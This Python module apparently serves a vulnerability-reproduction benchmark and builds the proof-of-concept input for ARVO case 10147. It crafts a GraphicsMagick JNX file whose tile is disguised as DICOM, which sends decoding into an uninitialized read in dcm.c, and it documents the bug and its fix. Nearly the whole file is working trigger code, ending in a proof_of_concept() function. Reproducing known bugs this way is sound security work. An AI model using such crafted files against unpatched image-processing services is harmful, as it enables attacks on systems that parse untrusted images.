"""CG-08（arvo:10147 / GraphicsMagick JNX）输入构造器。

缺陷（coders/jnx.c 的 ExtractTileJPG）：JNX 的每个 tile 交给 BlobToImage 解码时，
没有把解码器钉死成 JPEG。父调用的 image_info 里带着 JNX 的 magick，
所以 GraphicsMagick 会按 blob 头重新识别格式；只要 tile 内容在 blob 偏移 128 处带
"DICM"，该 tile 就会被 DCM（DICOM）解码器吃掉，走进 dcm.c 的未初始化读取
（CWE-457，MSan: use-of-uninitialized-value @ funcDCM_PhotometricInterpretation）。
fix 版把 clone_info->filename 设成 "JPEG:"，tile 只能走 JPEG 解码器，这条路径被切断。

JNX 二进制布局（全部小端）：
    0   48B  header: version, device_sn, NE(lat,lon), SW(lat,lon), levels,
                    expiration, product_id, crc, sig_version, sig_offset
                    （version >= 4 时多 4B ZOrder；本构造器默认 version=3）
    48  12B×levels: tile_count, tiles_offset, scale
    ..  28B×tile:   NE(lat,lon), SW(lat,lon), pic_w(u16), pic_h(u16),
                    pic_size(u32), pic_offset(u32)
    ..  tile payload（本构造器把第一个 tile 的 payload 紧跟其后）

关键点：ExtractTileJPG 会自己写 blob[0..1]=FF D8，所以 tile payload 的第 0 字节落在
blob 偏移 2。要让 DICOM 魔数 "DICM" 正好落在 blob 偏移 128（即 payload 偏移 126），
payload 必须前 126 字节是填充。
"""
from __future__ import annotations

import struct

HEADER_SIZE = 48
LEVEL_INFO_SIZE = 12
TILE_INFO_SIZE = 28
JPEG_SOI = b"\xff\xd8"
DICM_OFFSET = 128
DICM_FILLER = 126          # blob 前 2 字节由 ExtractTileJPG 写入，payload 从 blob+2 开始

PAYLOAD_KINDS = ("dicom", "jpeg", "raw")

FIELDS = {
    "payload": "'dicom' | 'jpeg' | 'raw'（默认 dicom：把 tile 伪装成 DICOM）",
    "tile_hex": "str, payload=jpeg/raw 时的 tile 字节（hex）",
    "width": "int(0..65535), tile 的 PicWidth",
    "height": "int(0..65535), tile 的 PicHeight",
    "version": "int(0..4), JNX 头版本（>=4 会多 4B ZOrder，默认 3）",
    "pic_offset": "int, 覆盖 tile 的 PicOffset（默认指向 payload 起点）",
    "pic_size": "int, 覆盖 tile 的 PicSize（默认 payload 长度）",
}


class Cg08Result:
    """构造结果（用普通类而不是 dataclass：本模块可能被按文件路径动态加载）。"""

    def __init__(self, ok, data=b"", format="jnx", fields_used=None,
                 dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = format
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": len(self.data),
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def dicom_element(tag_group: int, tag_element: int, value: bytes) -> bytes:
    """隐式 VR 小端元素：group(2) element(2) length(4) value。"""
    return struct.pack("<HHI", tag_group, tag_element, len(value)) + value


def dicom_dataset(*, photometric: bytes = b"RGB\x00", rows: int = 16,
                  columns: int = 16, bits_allocated: int = 8,
                  pixel_bytes: bytes = b"") -> bytes:
    """最小 DICOM 数据集（隐式 VR 小端），覆盖 PhotometricInterpretation 等标签。

    funcDCM_PhotometricInterpretation 会读 (0028,0004)；给足 RGB + 行列/位深后，
    解码器才继续走到像素阶段并复用那条未初始化读取。
    """
    out = bytearray()
    out += dicom_element(0x0028, 0x0004, photometric)
    out += dicom_element(0x0028, 0x0010, struct.pack("<H", rows & 0xFFFF))
    out += dicom_element(0x0028, 0x0011, struct.pack("<H", columns & 0xFFFF))
    out += dicom_element(0x0028, 0x0100, struct.pack("<H", bits_allocated & 0xFFFF))
    out += dicom_element(0x0028, 0x0002, struct.pack("<H", 1))
    out += dicom_element(0x7FE0, 0x0010, pixel_bytes)
    return bytes(out)


def dicom_tile_payload(*, photometric: bytes = b"RGB\x00", rows: int = 16,
                       columns: int = 16, bits_allocated: int = 8,
                       pixel_bytes: bytes = b"",
                       filler: bytes = b"\x00" * DICM_FILLER) -> bytes:
    """把 DICOM 文件塞进 tile：126B 填充 + "DICM" + 数据集。

    ExtractTileJPG 在 payload 前面加 FF D8，于是 "DICM" 正好落在 blob 偏移 128，
    命中 dcm.c 的 IsDCM()；fix 版强制 JPEG 解码器后这条路径不再可达。
    """
    if len(filler) != DICM_FILLER:
        raise ValueError("filler 必须是 %d 字节，实际 %d" % (DICM_FILLER, len(filler)))
    return bytes(filler) + b"DICM" + dicom_dataset(
        photometric=photometric, rows=rows, columns=columns,
        bits_allocated=bits_allocated, pixel_bytes=pixel_bytes)


def build(fields: dict) -> Cg08Result:
    """按字段组装一个单 level、单 tile 的 JNX 容器。"""
    fields = fields or {}
    used, dropped = {}, []
    kind = str(fields.get("payload") or "dicom").lower()
    if kind not in PAYLOAD_KINDS:
        return Cg08Result(False, reason="payload 只能是 %s" % (PAYLOAD_KINDS,))
    try:
        version = int(fields.get("version", 3))
        width = int(fields.get("width", 256))
        height = int(fields.get("height", 256))
    except (TypeError, ValueError):
        return Cg08Result(False, reason="version/width/height 必须是整数")
    if not 0 <= version <= 4:
        return Cg08Result(False, reason="version 越界: %s" % version)
    if not (0 <= width <= 0xFFFF and 0 <= height <= 0xFFFF):
        return Cg08Result(False, reason="width/height 越界")
    used.update({"payload": kind, "version": version, "width": width, "height": height})

    if kind == "dicom":
        payload = dicom_tile_payload()
    elif kind == "jpeg":
        raw = str(fields.get("tile_hex") or "")
        try:
            payload = bytes.fromhex(raw)
        except ValueError:
            return Cg08Result(False, reason="tile_hex 不是合法 hex")
        if payload.startswith(JPEG_SOI):
            payload = payload[2:]          # ExtractTileJPG 会自己补 SOI
    else:
        try:
            payload = bytes.fromhex(str(fields.get("tile_hex") or ""))
        except ValueError:
            return Cg08Result(False, reason="tile_hex 不是合法 hex")
    if not payload:
        return Cg08Result(False, reason="tile payload 为空")

    header_len = HEADER_SIZE + (4 if version >= 4 else 0)
    tiles_offset = header_len + LEVEL_INFO_SIZE
    payload_start = tiles_offset + TILE_INFO_SIZE
    pic_offset = int(fields.get("pic_offset", payload_start))
    pic_size = int(fields.get("pic_size", len(payload)))
    if pic_offset < 0 or pic_size < 0:
        return Cg08Result(False, reason="pic_offset/pic_size 不能为负")
    file_len = payload_start + len(payload)
    if pic_offset + pic_size > file_len:
        return Cg08Result(False, reason="pic_offset+pic_size 超出文件长度")
    used.update({"pic_offset": pic_offset, "pic_size": pic_size})

    header = struct.pack("<12I", version, 0, 0x133DF6A9, 0x000000C7, 0x12CBA882,
                         0x000080C6, 1, 0, 0, 0x09C99B5B, 0, 0)
    if version >= 4:
        header += struct.pack("<I", 0)
    level = struct.pack("<3I", 1, tiles_offset, 38218)
    tile = struct.pack("<iiiiHHII", 0x133DF6A9, 0x000000C7, 0x12CBA882, 0x000080C6,
                       width, height, pic_size, pic_offset)
    for key in fields:
        if key not in FIELDS:
            dropped.append({"field": key, "reason": "cg08 构造器不识别该字段"})
    return Cg08Result(True, header + level + tile + payload, "jnx", used, dropped)


def proof_of_concept() -> bytes:
    """ARVO 10147 的触发输入：JNX tile 伪装成 DICOM（DICM 落在 blob 偏移 128）。"""
    res = build({"payload": "dicom", "width": 256, "height": 256})
    if not res.ok:
        raise RuntimeError("cg08 builder failed: " + res.reason)
    return res.data
